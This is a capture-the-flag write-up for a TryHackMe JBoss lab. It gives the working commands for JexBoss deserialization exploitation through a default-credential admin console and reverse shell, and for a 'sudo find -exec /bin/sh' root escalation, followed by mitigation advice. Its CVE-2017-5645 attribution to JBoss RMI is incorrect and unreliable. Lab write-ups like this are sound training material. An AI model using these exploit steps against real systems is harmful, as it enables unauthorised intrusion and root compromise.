# Tony the Tiger - TryHackMe Writeup

## Overview
This room involves exploiting a Java deserialization vulnerability in a JBoss application server to gain remote code execution and escalate privileges to root.

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sV -sC 10.112.165.76
```

**Key Findings:**
- **Port 22/tcp** - SSH (OpenSSH 6.6.1p1 Ubuntu)
- **Port 80/tcp** - HTTP (Apache httpd 2.4.7, Hugo 0.66.0 blog)
- **Port 1090-1099/tcp** - Java RMI services
- **Port 4446/tcp** - Java Object Serialization
- **Port 5500/tcp** - Authentication service (CRAM-MD5, DIGEST-MD5, GSSAPI, NTLM)
- **Port 8009/tcp** - Apache Jserv (AJP13)
- **Port 8080/tcp** - Apache Tomcat/Coyote (JBoss AS)
- **Port 8083/tcp** - JBoss service httpd

### Web Enumeration

**Port 80 - Blog:**
```bash
gobuster dir -u http://10.112.165.76 -w /usr/share/wordlists/dirb/big.txt
```

Discovered directories:
- /categories, /css, /fonts, /images, /js
- /page, /posts, /tags, /sitemap.xml
- /.htaccess, /.htpasswd (403 Forbidden)
- /server-status (403 Forbidden)

**Port 8080 - JBoss:**
```bash
gobuster dir -u http://10.112.165.76:8080 -w /usr/share/wordlists/dirb/big.txt
```

Discovered endpoints:
- **/admin-console** (exposed)
- **/jmx-console** (vulnerable)
- **/JMXInvokerServlet** (vulnerable)
- /WEB-INF, /css, /images, /jbossws, /manager

---

## Exploitation

### Step 1: Identify Java Deserialization Vulnerabilities

The target is running **JBoss AS** with multiple Java deserialization vulnerabilities:
- Exposed admin-console
- Vulnerable jmx-console
- Vulnerable JMXInvokerServlet

### Step 2: Deploy Remote Code Execution

Using **JexBoss** (Java vulnerability scanner and exploitation tool):

```bash
./jexboss.py -u http://10.112.165.76:8080
```

The tool identified:
- ✓ admin-console: EXPOSED
- ✓ jmx-console: VULNERABLE
- ✓ JMXInvokerServlet: VULNERABLE

### Step 3: Exploitation via Admin-Console

The tool attempted automatic exploitation through the admin-console with default credentials. After successful authentication, it deployed a reverse shell payload.

**Initial Access:**
- User: `cmnatic` (1000:1000)
- Current working directory: `/`

```bash
# Verify initial shell access
id
# uid=1000(cmnatic) gid=1000(cmnatic) groups=1000(cmnatic),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)
```

---

## Enumeration & Credential Discovery

### Discover System Users

```bash
ls /home
# Output: cmnatic, jboss, tony
```

### Found Credentials

Located a note in the JBoss home directory containing important information:
```bash
cat /home/jboss/note
```

This note contains hints about password resets and potential credential paths.

### First User Flag

Located in `/home/jboss/.jboss.txt` (hidden file)

---

## Privilege Escalation

### Phase 1: Escalate to JBoss User

Using credentials discovered in the note, switched to the `jboss` user:
```bash
su jboss
```

### Phase 2: Check Sudo Privileges

```bash
sudo -l
```

**Output:**
```
User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
```

**Critical Finding:** The `jboss` user can run `/usr/bin/find` with NOPASSWD sudo privileges.

### Phase 3: Root Escalation via Find

Exploited the misconfigured sudo privilege using the `-exec` flag in `find`:

```bash
sudo find . -exec /bin/sh \; -quit
```

This spawns a root shell due to the NOPASSWD sudo configuration.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

### Phase 4: Retrieve Root Flag

Located in `/root/root.txt` (base64 encoded)

---

## Key Vulnerabilities Exploited

| Vulnerability | Severity | Impact |
|---|---|---|
| Java Deserialization (RCE) | Critical | Unpatched JBoss AS with vulnerable RMI endpoints |
| Default/Weak Credentials | High | Accessible admin-console with default authentication |
| Weak Sudo Configuration | Critical | `jboss` user can run `find` with NOPASSWD |
| Unsafe Find Usage | Critical | `-exec` flag can execute arbitrary commands as root |

---

## Attack Chain Summary

```
Initial Access (JexBoss RCE)
        ↓
cmnatic User (1000:1000)
        ↓
Discover Credentials in /home/jboss/note
        ↓
Switch to jboss User
        ↓
Identify NOPASSWD sudo on /usr/bin/find
        ↓
Exploit find -exec to spawn root shell
        ↓
Root Access (0:0)
```

---

## Mitigation Recommendations

1. **Update JBoss** - Patch to the latest version with Java deserialization security fixes
2. **Disable Remote Services** - Restrict RMI and admin-console access to trusted networks only
3. **Enforce Strong Authentication** - Remove all default credentials and enforce strong password policies
4. **Restrict Sudo Privileges** - Avoid granting NOPASSWD to powerful commands like `find`, `find -exec`, or shell access
5. **Implement Network Segmentation** - Isolate internal services from direct internet access
6. **Enable Monitoring & Logging** - Log all sudo executions, RMI activity, and authentication attempts
7. **File Permissions** - Secure sensitive configuration files and credential storage

---

## Tools Used

- **nmap** - Service discovery and version enumeration
- **gobuster** - Web directory and endpoint discovery
- **JexBoss** - Java vulnerability scanner and automated exploitation
- **netcat** - Reverse shell listener
- **find** - Linux command for privilege escalation exploitation

---

## References

- JexBoss GitHub: https://github.com/joaomatosf/jexboss
- CWE-502: Deserialization of Untrusted Data
- CVE-2017-5645: JBoss RMI Registry Vulnerability
- GTFOBins - find: https://gtfobins.github.io/gtfobins/find/
